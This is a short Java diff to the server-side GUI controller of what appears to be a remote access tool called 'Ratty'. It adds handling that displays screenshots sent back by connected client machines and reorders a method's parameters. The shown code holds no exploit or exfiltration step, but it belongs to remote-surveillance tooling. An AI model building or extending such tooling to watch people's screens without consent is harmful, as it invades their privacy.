@@ -1,5 +1,6 @@
 package de.sogomn.rat.server.gui;
 
+import java.awt.image.BufferedImage;
 import java.util.ArrayList;
 
 import de.sogomn.rat.ActiveConnection;
@@ -34,6 +35,12 @@ public final class RattyGuiController implements IServerObserver, IConnectionObs
 	 * HANDLING
 	 * ==================================================
 	 */
+	
+	private void showScreenshot(final ServerClient client, final ScreenshotPacket packet) {
+		final BufferedImage image = packet.getImage();
+		
+		client.displayPanel.showImage(image);
+	}
 	
 	private PopupPacket createPopupPacket() {
 		final String input = gui.getInput();
@@ -72,14 +79,26 @@ public final class RattyGuiController implements IServerObserver, IConnectionObs
 	}
 	
 	private boolean handlePacket(final ServerClient client, final IPacket packet) {
-		return false;
+		final Class<? extends IPacket> clazz = packet.getClass();
+		
+		boolean consumed = true;
+		
+		if (clazz == ScreenshotPacket.class) {
+			final ScreenshotPacket screenshot = (ScreenshotPacket)packet;
+			
+			showScreenshot(client, screenshot);
+		} else {
+			consumed = false;
+		}
+		
+		return consumed;
 	}
 	
 	private void handleCommand(final ServerClient client, final String command) {
 		//...
 	}
 	
-	private IPacket getPacket(final String command, final ServerClient client) {
+	private IPacket getPacket(final ServerClient client, final String command) {
 		IPacket packet = null;
 		
 		if (command == RattyGui.FREE) {
@@ -172,7 +191,7 @@ public final class RattyGuiController implements IServerObserver, IConnectionObs
 	@Override
 	public void userInput(final String command) {
 		final ServerClient client = gui.getLastServerClientClicked();
-		final IPacket packet = getPacket(command, client);
+		final IPacket packet = getPacket(client, command);
 		
 		handleCommand(client, command);
 		
